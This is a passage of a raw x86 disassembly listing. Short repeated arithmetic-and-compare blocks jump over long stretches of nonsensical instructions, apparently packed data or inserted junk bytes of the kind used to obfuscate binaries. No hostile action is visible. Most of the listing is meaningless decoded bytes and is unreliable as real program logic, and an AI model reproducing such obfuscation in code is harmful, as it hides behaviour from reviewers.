  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403ab0
  403acb:	push   esi
  403acc:	mov    ecx,0x7e102077
  403ad1:	jle    0x403b2b
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403ada
  403ad7:	pop    ds
  403ad8:	nop
  403ad9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ada:	ss mov ebp,0xf1a22f83
  403ae0:	add    DWORD PTR [esi+0x4650ba12],esp
  403ae6:	push   0x60
  403ae8:	sbb    DWORD PTR [eax],esp
  403aea:	into   
  403aeb:	out    dx,al
  403aec:	jl     0x403ae7
  403aee:	ss mov edx,0x8f01f798
  403af4:	and    BYTE PTR [eax],0xb7
  403af7:	pusha  
  403af8:	inc    esi
  403af9:	pop    ds
  403afa:	scas   eax,DWORD PTR es:[edi]
  403afb:	dec    esi
  403afc:	arpl   ax,di
  403afe:	bound  ecx,QWORD PTR [ebx+ebp*4+0x1f]
  403b02:	shl    DWORD PTR [esp-0x58935183],0x39
  403b0a:	cwde   
  403b0b:	sbb    eax,0x89d80bd7
  403b10:	fcmovne st,st(6)
  403b12:	pop    ds
  403b13:	bound  eax,QWORD PTR [ecx]
  403b15:	xchg   ecx,eax
  403b16:	pop    eax
  403b17:	sbb    DWORD PTR [esi],edx
  403b19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b1a:	xchg   ebx,eax
  403b1b:	fimul  DWORD PTR [ecx+0x1d]
  403b1e:	dec    ecx
  403b1f:	test   DWORD PTR ds:0xcb12c319,esp
  403b25:	xchg   esi,eax
  403b26:	(bad)  
  403b27:	xor    bh,BYTE PTR [ebx+eax*8+0x3]
  403b2b:	dec    ebx
  403b2c:	out    0xf2,al
  403b2e:	(bad)  
  403b2f:	mov    ds:0xe7714cfa,al
  403b34:	popa   
  403b35:	mov    esp,0x590e6686
  403b3a:	rol    DWORD PTR [esi-0x32b19e20],cl
  403b40:	retf   0xa579
  403b43:	test   eax,0x62c58fe
  403b48:	dec    esi
  403b49:	inc    esp
  403b4a:	dec    esp
  403b4b:	fisub  DWORD PTR [ebx-0x72]
  403b4e:	mov    eax,0x317b3f7d
  403b53:	and    al,0xb0
  403b55:	fistp  QWORD PTR [ebx]
  403b57:	es and eax,0x7483405f
  403b5d:	mov    ch,0x45
  403b5f:	and    DWORD PTR [ebx+0x77],0xf6b55758
  403b66:	popf   
  403b67:	adc    bh,bl
  403b69:	shl    BYTE PTR [esi-0x80],1
  403b6c:	sbb    ebx,DWORD PTR [ecx+0x12a09c85]
  403b72:	mov    ch,0x38
  403b74:	xchg   ebp,eax
  403b75:	mov    edi,DWORD PTR ds:0x38ad4f64
  403b7b:	inc    edx
  403b7c:	jle    0x403b56
  403b7e:	(bad)  
  403b7f:	clc    
  403b80:	pusha  
  403b81:	ins    BYTE PTR es:[edi],dx
  403b82:	add    DWORD PTR [ebx+0x1c912fdd],0xb9e1cea5
  403b8c:	pushf  
  403b8d:	and    BYTE PTR [esi+0x29],dl
  403b90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b91:	mov    eax,0x8c9e9059
  403b96:	retw   0xe4d3
  403b9a:	sbb    ecx,ecx
  403b9c:	test   eax,0x937de9c0
  403ba1:	hlt    
  403ba2:	(bad)  
  403ba4:	mov    eax,ds:0x731cef28
  403ba9:	mov    esi,0x44f22a6e
  403bae:	shr    DWORD PTR [ecx],1
  403bb0:	mov    ds:0xc968353e,al
  403bb5:	mov    edx,0x6fdfd4d2
  403bba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bbb:	int3   
  403bbc:	mov    eax,ds:0x934cb64f
  403bc1:	xchg   esp,eax
  403bc2:	scas   al,BYTE PTR es:[edi]
  403bc3:	mov    es,WORD PTR [eax]
  403bc5:	iret   
  403bc6:	add    BYTE PTR [edi],dh
  403bc8:	xchg   ebx,eax
  403bc9:	xchg   BYTE PTR ds:0xec0f9f13,al
  403bcf:	fnsave es:[eax-0x53a419ec]
  403bd6:	das    
  403bd7:	xor    al,0x8b
  403bd9:	lods   al,BYTE PTR ss:[esi]
  403bdb:	hlt    
  403bdc:	jl     0x403be9
  403bde:	outs   dx,DWORD PTR ds:[esi]
  403bdf:	ja     0x403c2e
  403be1:	inc    edx
  403be2:	inc    edx
  403be3:	sbb    bl,BYTE PTR [eax+0x3c]
  403be6:	ss es mov cl,cl
  403bea:	call   0x1d6ee877
  403bef:	xchg   eax,ebx
  403bf1:	into   
  403bf2:	jnp    0x403c18
  403bf4:	or     DWORD PTR [edx],ebx
  403bf6:	scas   eax,DWORD PTR es:[edi]
  403bf7:	ja     0x403b97
  403bf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bfa:	or     BYTE PTR [ecx+0x65],0x46
  403bfe:	pusha  
  403bff:	adc    BYTE PTR [esi+0x47],ch
  403c02:	mov    al,ds:0x4dbd996d
  403c07:	jns    0x403bf8
  403c09:	mov    ebx,0x2033e5dc
  403c0e:	sbb    eax,0x215221a4
  403c13:	jmp    0x403c2f
  403c15:	retf   
  403c16:	arpl   bx,ax
  403c18:	in     eax,0xe8
  403c1a:	fld    DWORD PTR [ebp-0x70316ec4]
  403c20:	pop    esi
  403c21:	jno    0x403c01
  403c23:	adc    al,0x61
  403c25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c26:	pop    ds
  403c27:	push   ds
  403c28:	fs mov dh,0xef
  403c2b:	daa    
  403c2c:	add    ecx,DWORD PTR [edx]
  403c2e:	arpl   WORD PTR [esi-0x7ee41ee1],bp
  403c34:	cmp    ebx,DWORD PTR [esi]
  403c36:	inc    sp
  403c38:	cdq    
  403c39:	icebp  
  403c3a:	aaa    
  403c3b:	or     DWORD PTR [ebp+0x1906db69],edi
  403c41:	sub    al,0xb6
  403c43:	loope  0x403c98
  403c45:	out    0xe7,eax
  403c47:	mov    eax,ds:0x5203d884
  403c4c:	push   0xe86304fe
  403c51:	cmp    DWORD PTR ds:0xcd2b3099,ebp
  403c57:	daa    
  403c58:	jno    0x403cc1
  403c5a:	aaa    
  403c5b:	and    BYTE PTR [ecx],ch
  403c5d:	lock xchg ebx,eax
  403c5f:	add    eax,0x77489377
  403c64:	adc    eax,DWORD PTR [esi+0x5]
  403c67:	pop    ebx
  403c68:	add    eax,0x88180a99
  403c6d:	adc    DWORD PTR [si+0x6b],esp
  403c71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c72:	push   edx
  403c73:	je     0x403c31
  403c75:	and    BYTE PTR [esi],dh
  403c77:	push   cs
  403c78:	div    al
  403c7a:	sahf   
  403c7b:	pusha  
  403c7c:	rol    BYTE PTR [ebp+0x7c],0x41
  403c80:	jnp    0x403c1d
  403c82:	out    dx,al
  403c83:	jmp    0x403cec
  403c85:	repnz push ebx
  403c87:	push   ds
  403c88:	pusha  
  403c89:	jp     0x403ca2
  403c8b:	xchg   DWORD PTR [edi+ebp*1],esi
  403c8e:	enter  0x6016,0x9e
  403c92:	xor    ebx,DWORD PTR [ebp-0x6c]
  403c95:	mov    bl,0xbe
  403c97:	fidiv  DWORD PTR [ebx+edi*2+0x39]
  403c9b:	icebp  
  403c9c:	outs   dx,BYTE PTR ds:[esi]
  403c9d:	push   ebx
  403c9e:	(bad)  
  403ca0:	xchg   ecx,eax
  403ca1:	and    al,0xd8
  403ca3:	push   0x4a
  403ca5:	mov    bl,0xc4
  403ca7:	mov    al,ds:0xb76a94ac
  403cac:	adc    ah,cl
  403cae:	cs sub ch,al
  403cb1:	repz jnp 0x403c98
  403cb4:	fbld   TBYTE PTR [ebx-0x11d96030]
  403cba:	mov    ch,0xc2
  403cbc:	ds cwde 
  403cbe:	mov    ecx,0xded4769
  403cc3:	jmp    0x403cfb
  403cc5:	rcr    esp,0xff
  403cc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cc9:	sub    bl,dh
  403ccb:	mov    WORD PTR [ecx+0xd9c2dee],?
  403cd1:	cmp    DWORD PTR [edi-0xa5b84f7],eax
  403cd7:	and    esi,DWORD PTR [esi+eax*1+0x196c3c6d]
  403cde:	mov    ebx,DWORD PTR [esi+0x41]
  403ce1:	fwait
  403ce2:	loop   0x403c8c
  403ce4:	mov    ebx,0x572a838c
  403ce9:	dec    esp
  403cea:	inc    edi
  403ceb:	jnp    0x403d10
  403ced:	pop    esp
  403cee:	cmc    
  403cef:	enter  0x8f4e,0x27
  403cf3:	(bad)  
  403cf4:	in     al,dx
  403cf5:	push   ebx
  403cf6:	add    BYTE PTR [ebx-0x4833ab0d],bl
  403cfc:	fdiv   st,st(7)
  403cfe:	or     edi,DWORD PTR [esi-0x665f22cb]
  403d04:	ins    BYTE PTR es:[edi],dx
  403d05:	ja     0x403d16
  403d07:	and    eax,0xa1f0df8c
  403d0c:	lahf   
  403d0d:	sar    al,1
  403d0f:	and    al,0xb6
  403d11:	pop    es
  403d12:	clc    
  403d13:	fidivr DWORD PTR [edi+0x5b]
  403d16:	loope  0x403d37
  403d18:	xor    bl,BYTE PTR [ebx+0x62]
  403d1b:	sbb    al,0x1f
  403d1d:	push   es
  403d1e:	xor    edi,esi
  403d20:	stos   DWORD PTR es:[edi],eax
  403d21:	ins    DWORD PTR es:[edi],dx
  403d22:	fucomip st,st(4)
  403d24:	call   0xc788:0x7986111a
  403d2b:	jp     0x403cf3
  403d2d:	ja     0x403ce6
  403d2f:	stos   BYTE PTR es:[edi],al
  403d30:	not    ch
  403d32:	scas   eax,DWORD PTR es:[edi]
  403d33:	inc    ebx
  403d34:	iret   
  403d35:	adc    DWORD PTR [eax],ebx
  403d37:	sbb    edx,DWORD PTR [ebx-0x3fe5121]
  403d3d:	dec    esi
  403d3e:	mov    ebp,0x6d4f218f
  403d43:	xlat   BYTE PTR ds:[ebx]
  403d44:	pop    edx
  403d45:	lahf   
  403d46:	inc    edi
  403d47:	xor    DWORD PTR [ecx-0x5817bc6d],ecx
  403d4d:	mov    esp,0xb0720bc0
  403d52:	repz sub cl,dh
  403d55:	mov    esi,0x85e1b094
  403d5a:	push   cs
  403d5b:	(bad)  
  403d5c:	(bad)  
  403d5e:	push   ebx
  403d5f:	xchg   esp,eax
  403d60:	leave  
  403d61:	repnz xchg edx,eax
  403d63:	push   eax
  403d64:	xor    BYTE PTR [ecx-0x5c],0x51
  403d68:	idiv   DWORD PTR [esi+eax*1+0x10d93e44]
  403d6f:	add    DWORD PTR [esi-0x4b204b71],0x1b
  403d76:	push   edi
  403d77:	daa    
  403d78:	ret    0xfa6d
  403d7b:	adc    ebp,edx
  403d7d:	(bad)  [ebx+ebx*1+0x78]
  403d81:	popf   
  403d82:	(bad)  [eax-0x2a31e3d5]
  403d88:	push   esi
  403d89:	mov    ch,0x5b
  403d8b:	call   FWORD PTR [esi+ebx*4-0x590d6e63]
  403d92:	retf   
  403d93:	retf   
  403d94:	ret    0xfecb
  403d97:	test   DWORD PTR [edi+esi*1-0x4],edi
  403d9b:	and    edi,edi
  403d9d:	push   ebp
  403d9e:	push   cs
  403d9f:	push   ax
  403da1:	lods   eax,DWORD PTR ds:[esi]
  403da2:	sub    DWORD PTR [eax],0x81ef76ec
  403da8:	scas   al,BYTE PTR es:[edi]
  403da9:	pop    es
  403daa:	xchg   ebx,eax
  403dab:	jo     0x403d6c
  403dad:	xor    al,0xd7
  403daf:	std    
  403db0:	stos   DWORD PTR es:[edi],eax
  403db1:	jo     0x403e09
  403db3:	xchg   ebx,ebp
  403db5:	arpl   sp,sp
  403db7:	inc    ecx
  403db8:	sub    BYTE PTR [eax+0x5d8bf992],0xf0
  403dbf:	sub    ebx,edi
  403dc1:	cmp    ebx,edx
  403dc3:	ja     0x403dd1
  403dc9:	mov    edx,DWORD PTR [ebp-0x28]
  403dcc:	jmp    0x404176
  403dd1:	mov    edx,DWORD PTR [ebp-0x30]
  403dd4:	mov    edi,DWORD PTR [ebp-0x4]
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0x26
  403e75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e76:	adc    eax,0x7e1f0aab
  403e7b:	jle    0x403ed5
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403e07
  403e81:	jo     0x403f01
  403e83:	and    DWORD PTR [ebx+0x711769b4],ebp
  403e89:	rcr    dl,1
  403e8b:	lock jge 0x403edc
  403e8e:	mov    ch,0x3
  403e90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e91:	repz (bad) 
  403e94:	add    BYTE PTR [edx+edi*4-0x54015ea],dl
  403e9b:	inc    ecx
  403e9c:	xchg   esp,eax
  403e9d:	xchg   esp,eax
  403e9e:	fwait
  403e9f:	cs and eax,0x381a83b0
  403ea5:	icebp  
  403ea6:	inc    edx
  403ea7:	cdq    
  403ea8:	test   eax,0xd1fa3a0b
  403ead:	pop    DWORD PTR [eax-0x31b0c972]
  403eb3:	bnd jae 0x403f0a
  403eb6:	or     ebx,0x6f
  403eb9:	test   edx,eax
  403ebb:	(bad)  
  403ebc:	sahf   
  403ebd:	jmp    0x403eee
  403ebf:	jmp    0x5c84:0x9d7834f1
  403ec6:	repz je 0x403f33
  403ec9:	pushf  
  403eca:	jge    0x403ec2
  403ecc:	xlat   BYTE PTR ds:[ebx]
  403ecd:	jo     0x403ea0
  403ecf:	jno    0x403f10
  403ed1:	mov    WORD PTR [eax],cs
  403ed3:	jle    0x403e84
  403ed5:	jae    0x403f48
  403ed7:	in     eax,dx
  403ed8:	dec    edi
  403ed9:	jmp    0x403e6c
  403edb:	inc    edi
  403edc:	call   0x1b9172ff
  403ee1:	mov    eax,DWORD PTR [eax+0x2f]
  403ee4:	xlat   BYTE PTR ds:[ebx]
  403ee5:	or     eax,0xc446e4fa
  403eea:	or     ebx,edx
  403eec:	dec    edx
  403eed:	or     BYTE PTR [edi-0x2ce2c2a0],bh
  403ef3:	test   BYTE PTR [edx+0x73abc00],cl
  403ef9:	and    BYTE PTR [eax],bh
  403efb:	addr16 jne 0x403f77
  403efe:	or     cl,BYTE PTR [esi+0x45c64ef]
  403f04:	jge    0x403f05
  403f06:	(bad)  
  403f07:	cs repnz pop ecx
  403f0a:	cli    
  403f0b:	shr    DWORD PTR [ebx+ebx*1],0x4c
  403f0f:	ror    DWORD PTR [edx+0x6a],cl
  403f12:	ins    BYTE PTR es:[edi],dx
  403f13:	cli    
  403f14:	xchg   edi,eax
  403f15:	push   esp
  403f16:	lods   eax,DWORD PTR ds:[esi]
  403f17:	in     al,dx
  403f18:	lea    edi,[ecx+edx*1-0x29f5ac84]
  403f1f:	dec    esi
  403f20:	aas    
  403f21:	inc    ecx
  403f22:	push   eax
  403f23:	xchg   esi,eax
  403f24:	ret    
  403f25:	cmp    DWORD PTR [eax*4-0x7db74fb1],ebx
  403f2c:	xor    al,0xf1
  403f2e:	pop    esp
  403f2f:	push   ebx
  403f30:	pop    ebx
  403f31:	jno    0x403f01
  403f33:	sub    BYTE PTR [ebx+0x4aee8388],ah
  403f39:	pop    ss
  403f3a:	ret    0xa84f
  403f3d:	mov    esi,0xcae4ecd7
  403f42:	cwde   
  403f43:	dec    DWORD PTR [ecx]
  403f45:	dec    eax
  403f46:	test   eax,0x36f84e91
  403f4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f4c:	sbb    DWORD PTR ds:0xeada14cd,eax
  403f52:	adc    eax,0x84626097
  403f57:	je     0x403fd1
  403f59:	leave  
  403f5a:	add    DWORD PTR [esi],edi
  403f5c:	retf   
  403f5d:	jmp    0x99c37561
  403f62:	jno    0x403fb9
  403f64:	test   ah,dl
  403f66:	rol    BYTE PTR [eax+0x1d],1
  403f69:	and    eax,0x6546c81c
  403f6e:	sbb    eax,0x52c12f4f
  403f73:	fs xor eax,0x1db74c2d
  403f79:	jge    0x403fd5
  403f7b:	sub    al,0x6
  403f7d:	add    eax,0x90085991
  403f82:	in     al,dx
  403f83:	lods   al,BYTE PTR ds:[esi]
  403f84:	(bad)  
  403f85:	jb     0x403f64
  403f87:	sbb    DWORD PTR [ebp-0x3ded59dd],esp
  403f8d:	adc    DWORD PTR [edx+ebx*8+0x28],0x55
  403f92:	push   ebx
  403f93:	or     BYTE PTR [esi+0x3a],ch
  403f96:	adc    al,0x5
  403f98:	mov    esp,0x56f9849f
  403f9d:	xchg   esi,eax
  403f9e:	repnz stos BYTE PTR es:[edi],al
  403fa0:	pop    esi
  403fa1:	dec    eax
  403fa2:	mov    edx,0x9cfdeb58
  403fa7:	inc    ecx
  403fa8:	xor    al,0xf7
  403faa:	ja     0x403fdb
  403fac:	fs ja  0x404011
  403faf:	mov    dh,BYTE PTR [edi+0x23]
  403fb2:	mov    ah,al
  403fb4:	shl    edi,cl
  403fb6:	std    
  403fb7:	mov    bh,0x47
  403fb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fba:	mov    al,ds:0x7db83669
  403fbf:	inc    eax
  403fc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fc1:	xchg   ecx,eax
  403fc2:	xchg   DWORD PTR [ecx],ecx
  403fc4:	aam    0xf5
  403fc6:	shl    BYTE PTR [esi-0x13],cl
  403fc9:	mov    BYTE PTR [esi],cl
  403fcb:	inc    esp
  403fcc:	push   ss
  403fcd:	mov    bh,BYTE PTR [esi+0x1d]
  403fd0:	sub    eax,0xbc00e865
  403fd5:	in     al,dx
  403fd6:	push   ebx
  403fd7:	pop    ecx
  403fd8:	push   esp
  403fda:	xor    al,0x52
  403fdc:	retf   0x2290
  403fdf:	lss    ecx,FWORD PTR [edx]
  403fe2:	ins    BYTE PTR es:[edi],dx
  403fe3:	cmp    eax,eax
  403fe5:	mov    ah,0x9a
  403fe7:	int    0x67
  403fe9:	or     bl,ah
  403feb:	popa   
  403fec:	fcmovnbe st,st(4)
  403fee:	push   eax
  403fef:	mov    bh,0x88
  403ff1:	rol    BYTE PTR [edx+0x7477bf49],0x8b
  403ff8:	ins    DWORD PTR es:[edi],dx
  403ff9:	adc    edx,eax
  403ffb:	fisubr DWORD PTR [edi]
  403ffd:	sbb    eax,0xc1672c2b
  404002:	xchg   esp,eax
  404003:	ret    
  404004:	out    dx,eax
  404005:	retf   
  404006:	stos   BYTE PTR es:[edi],al
  404007:	sahf   
  404008:	ss and ebx,ebp
  40400b:	push   edx
  40400c:	inc    ebp
  40400d:	mov    ds:0xb2ad22a6,al
  404012:	pop    esi
  404013:	push   esp
  404014:	popa   
  404015:	xchg   ebx,eax
  404016:	add    BYTE PTR [ecx],dh
  404018:	push   ebx
  404019:	and    bl,bl
  40401b:	int    0xdd
  40401d:	xchg   ebx,eax
  40401e:	sub    DWORD PTR [esi+0x41],edi
  404021:	daa    
  404022:	inc    ebp
  404023:	pop    edx
  404024:	outs   dx,BYTE PTR ds:[esi]
  404025:	and    ebx,DWORD PTR [ecx-0x73]
  404028:	aad    0x5f
  40402a:	mov    cl,0xa6
  40402c:	push   ebp
  40402d:	outs   dx,BYTE PTR ds:[esi]
  40402e:	adc    DWORD PTR [ebx+0x4c1b616e],esp
  404034:	mov    dl,0xa1
  404036:	jle    0x404085
  404038:	and    al,0x91
  40403a:	jl     0x40409a
  40403c:	or     ebx,DWORD PTR [eax]
  40403e:	mov    al,0x49
  404040:	(bad)  
  404041:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404042:	sbb    al,0x9
  404044:	pop    ss
  404045:	xchg   ebx,eax
  404046:	ss xor al,0x81
  404049:	ja     0x404002
  40404b:	add    al,0x8e
  40404d:	xor    ebp,DWORD PTR [eax+0x4c12aeac]
  404053:	sub    al,BYTE PTR [eax-0x4a]
  404056:	mov    ebx,edx
  404058:	jae    0x404044
  40405a:	pop    ebp
  40405b:	push   cs
  40405c:	mov    esi,0xbd5edc79
  404061:	clc    
  404062:	dec    esi
  404063:	mov    al,0x0
  404065:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404066:	ret    0xa42a
  404069:	push   ecx
  40406a:	mov    DWORD PTR [ebx+0x63386fdf],edi
  404070:	hlt    
  404071:	inc    esi
  404072:	and    eax,DWORD PTR [edi]
  404074:	push   ebp
  404075:	fnsave [eax+eiz*1+0x6d]
  404079:	add    esp,DWORD PTR [edi-0x3d]
  40407c:	mov    edx,0x5932be2f
  404081:	aam    0xa9
  404083:	daa    
  404084:	dec    ecx
  404085:	pop    ebp
  404086:	jecxz  0x40402f
  404088:	popa   
  404089:	(bad)  
  40408a:	xchg   esi,eax
  40408b:	lds    esp,FWORD PTR [ebp-0x6f]
  40408e:	jecxz  0x404034
  404090:	mov    edx,0xcaabcca5
  404095:	aam    0xc6
  404097:	inc    esp
  404098:	cmc    
  404099:	push   cs
  40409a:	push   esi
  40409b:	xor    DWORD PTR [ecx+0x40],ebp
  40409e:	in     al,0xf8
  4040a0:	fld    QWORD PTR [ebp-0x78cd4001]
  4040a6:	js     0x4040ec
  4040a8:	call   0xcebd:0xbfe90476
  4040af:	jno    0x404041
  4040b1:	or     DWORD PTR [ebp-0x1ef34431],0x4c
  4040b8:	lock (bad) 
  4040ba:	retf   
  4040bb:	jnp    0x40412a
  4040bd:	or     al,0xa0
  4040bf:	pop    ds
  4040c0:	test   eax,0xc97911c5
  4040c5:	cwde   
  4040c6:	mov    ebp,0x2d8f7caf
  4040cb:	push   esp
  4040cc:	adc    dl,BYTE PTR [esi-0x4]
  4040cf:	(bad)  
  4040d0:	sbb    eax,0xba59a607
  4040d5:	jmp    0x404131
  4040d7:	mov    dh,0xbf
  4040d9:	push   esi
  4040da:	add    bl,BYTE PTR [eax-0x7db296e0]
  4040e0:	shr    BYTE PTR [ebp+ecx*1+0x1315b72d],0x3c
  4040e8:	mov    esp,0xc9604116
  4040ed:	inc    ecx
  4040ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040ef:	jg     0x404132
  4040f1:	xlat   BYTE PTR ds:[ebx]
  4040f2:	in     eax,0x2b
  4040f4:	push   ebx
  4040f5:	add    edx,DWORD PTR [esi-0x12]
  4040f8:	into   
  4040f9:	ds (bad) 
  4040fb:	out    dx,eax
  4040fc:	add    bh,bl
  4040fe:	and    al,0xfc
  404100:	or     BYTE PTR [ebx-0x3],bl
  404103:	loope  0x40417c
  404105:	push   eax
  404106:	(bad)  
  404107:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404108:	mov    ecx,0x1471f058
  40410d:	sub    eax,0xaed21c26
  404112:	push   edx
  404113:	or     al,BYTE PTR [ebp-0x31d3a229]
  404119:	xor    bl,BYTE PTR [edi]
  40411b:	(bad)  
  40411c:	cmc    
  40411d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40411e:	cmp    esi,DWORD PTR ds:0xbae5accb
  404124:	or     BYTE PTR [edi],al
  404126:	rcl    BYTE PTR [edx],1
  404128:	xor    DWORD PTR [ebx],eax
  40412a:	aaa    
  40412b:	inc    esi
  40412c:	jae    0x404144
  40412e:	inc    esi
  40412f:	push   ss
  404130:	mov    dl,0x94
  404132:	mov    dl,0xca
  404134:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404135:	xchg   edx,eax
  404136:	cmp    eax,0x55be0593
  40413b:	fmulp  st(7),st
  40413d:	mov    BYTE PTR [esi-0x7],bh
  404140:	jmp    0x415a1914
  404145:	jmp    DWORD PTR [esi-0x2e1d732]
  40414b:	inc    edi
  40414c:	inc    esi
  40414d:	js     0x404197
  40414f:	push   ds
  404150:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404151:	icebp  
  404152:	sub    dl,dh
  404154:	in     eax,0xa6
  404156:	xor    DWORD PTR [ebx-0x44],ebp
  404159:	addr16 out dx,eax
  40415b:	mov    eax,0xf0f4fad4
  404160:	push   ebx
  404161:	pop    ebp
  404162:	adc    edi,DWORD PTR [eax]
  404164:	push   cs
  404165:	cmp    DWORD PTR [ebx],ebp
  404167:	fistp  QWORD PTR [ebx]
  404169:	fimul  DWORD PTR [ebx-0x79f037ab]
  40416f:	add    eax,DWORD PTR [eax]
  404171:	add    BYTE PTR [eax],al
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    BYTE PTR [eax-0x71],ah
  40418c:	data16 ss je 0x4041ad
  404190:	jle    0x404210
  404192:	pop    eax
  404193:	jl     0x404213
  404195:	jle    0x4041bf
  404197:	iret   
  404198:	jle    0x4041bf
  40419a:	push   edx
  40419b:	cmp    DWORD PTR [edi+0x29],eax
  40419e:	push   edx
  40419f:	in     al,0xe8
  4041a1:	fistp  DWORD PTR [eax+0x29]
  4041a4:	stc    
  4041a5:	dec    esp
  4041a6:	ss adc al,bh
  4041a9:	jae    0x404170
  4041ab:	xlat   BYTE PTR ds:[ebx]
  4041ac:	dec    edi
  4041ad:	push   ebp
  4041ae:	lea    esp,[ebp+eax*8+0x143c2114]
  4041b5:	(bad)  
  4041b6:	sub    eax,0x2b2cf838
  4041bb:	loope  0x404151
  4041bd:	lds    ebp,FWORD PTR [esi-0x59fab165]
  4041c3:	or     eax,0x3505df2e
  4041c8:	popa   
  4041c9:	sahf   
  4041ca:	dec    esi
  4041cb:	and    eax,0xd21e1a2f
  4041d0:	es push eax
  4041d2:	jg     0x40423d
  4041d4:	call   0x662b714f
  4041d9:	test   ebp,eax
  4041db:	fs pop ss
  4041dd:	das    
  4041de:	cld    
  4041df:	xor    eax,0x84df6686
  4041e4:	pop    eax
  4041e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041e6:	and    edi,ebp
  4041e8:	mov    cs:0xd3a419b2,eax
  4041ee:	xlat   BYTE PTR ds:[ebx]
  4041ef:	jmp    0x404181
  4041f1:	shl    BYTE PTR [ebp+0x4d],cl
  4041f4:	adc    BYTE PTR [ebp-0x7124782a],0x60
  4041fb:	adc    al,0x75
  4041fd:	push   ecx
  4041fe:	sbb    al,0xa1
  404200:	mov    esp,0xf746d422
  404205:	fs aas 
  404207:	test   eax,0x272b8f97
  40420c:	push   0x59
  40420e:	rol    BYTE PTR [edx],cl
  404210:	sub    eax,0x72159579
  404215:	stos   DWORD PTR es:[edi],eax
  404216:	lock xchg ecx,eax
  404218:	sar    ebp,1
  40421a:	pusha  
  40421b:	jl     0x404228
  40421d:	test   BYTE PTR [esp+eiz*8+0x8],bl
  404221:	xor    BYTE PTR [ecx+ebp*4],bl
  404224:	imul   ebx,esi,0xa6690f6d
  40422a:	inc    esp
  40422b:	out    0x1d,al
  40422d:	cmc    
  40422e:	add    al,0x20
  404230:	or     al,0xb
  404232:	push   edx
  404233:	cmp    dl,ch
  404235:	xor    al,0x23
  404237:	xlat   BYTE PTR ds:[ebx]
  404238:	(bad)  
  404239:	sub    BYTE PTR [ebx],al
  40423b:	ss mov esp,0x875e44fd
